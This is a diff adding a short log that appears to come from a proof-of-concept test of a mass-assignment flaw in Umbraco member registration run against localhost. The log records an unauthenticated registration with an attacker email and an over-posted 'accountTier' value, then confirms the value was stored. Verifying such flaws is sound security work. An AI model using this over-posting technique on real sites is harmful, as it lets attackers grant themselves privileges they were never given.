@@ -1,0 +1,16 @@
+unauthenticated GET http://localhost:29184/reg3b51665d/ -> 200 (form with ufprt)
+unauthenticated POST registration -> 302
+attacker email: attacker_d9b8278b@evil.invalid
+over-posted non-editable property: accountTier = PWNED-premium-073af8b5f46f
+admin read-back member id: c44a10f7-eab1-4057-86eb-d3fe32a2ba71
+member values[] after registration:
+[
+  {
+    "editorAlias": "Umbraco.TextBox",
+    "culture": null,
+    "segment": null,
+    "alias": "accountTier",
+    "value": "PWNED-premium-073af8b5f46f"
+  }
+]
+=> accountTier persisted from attacker input: True
